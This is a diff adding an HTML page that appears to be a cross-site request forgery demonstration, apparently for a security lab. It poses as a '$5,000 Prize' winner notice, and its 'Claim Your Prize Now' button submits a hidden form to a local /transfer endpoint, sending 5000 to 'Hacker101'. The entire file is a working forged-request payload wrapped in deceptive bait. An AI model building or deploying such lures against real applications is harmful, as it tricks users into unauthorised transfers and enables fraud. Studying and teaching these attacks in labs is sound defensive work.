@@ -1,0 +1,47 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Congratulations! 🎉</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+  <script src="https://cdn.jsdelivr.net/npm/@tailwindcss/browser@4"></script>
+  <style type="text/tailwindcss">
+    @layer utilities {
+      .bg-gradient-purple {
+        background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+      }
+      
+      .bg-gradient-gold {
+        background: linear-gradient(135deg, #ffeaa7 0%, #fdcb6e 100%);
+      }
+      
+      .text-gradient-purple {
+        background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+        -webkit-background-clip: text;
+        -webkit-text-fill-color: transparent;
+        background-clip: text;
+      }
+    }
+  </style>
+</head>
+<body class="font-['Inter'] min-h-screen flex items-center justify-center bg-linear-to-br from-white to-gray-50 p-5">
+  <!-- Main Container -->
+  <div class="relative bg-white/95 backdrop-blur-lg rounded-3xl px-12 py-15 shadow-[0_20px_60px_rgba(0,0,0,0.08)] text-center max-w-[500px] w-full border border-white/80 sm:px-8 sm:py-10">
+    <div class="text-8xl mb-5 sm:text-6xl">🎁</div>
+    <h1 class="text-4xl font-bold text-gradient-purple mb-4 leading-tight sm:text-3xl">Congratulations!</h1>
+    <p class="text-slate-500 text-base mb-10 leading-relaxed">You've been selected as our lucky winner!</p>
+    <div class="inline-block bg-gradient-gold text-gray-800 px-6 py-3 rounded-full text-lg font-semibold mb-8 shadow-[0_4px_15px_rgba(253,203,110,0.3)]">$5,000 Prize</div>
+    <form action="http://localhost:8080/transfer" method="POST">
+      <input type="hidden" name="amount" value="5000">
+      <input type="hidden" name="to" value="Hacker101">
+      <button type="submit" class="w-full px-8 py-[18px] text-base font-semibold text-white bg-gradient-purple border-none rounded-xl cursor-pointer transition-all duration-300 shadow-[0_8px_20px_rgba(102,126,234,0.3)] hover:-translate-y-0.5 hover:shadow-[0_12px_30px_rgba(102,126,234,0.4)] active:translate-y-0 active:shadow-[0_6px_15px_rgba(102,126,234,0.3)]">
+        Claim Your Prize Now
+      </button>
+    </form>
+    <p class="mt-6 text-xs text-slate-400">Limited time offer • No purchase necessary</p>
+  </div>
+</body>
+</html>
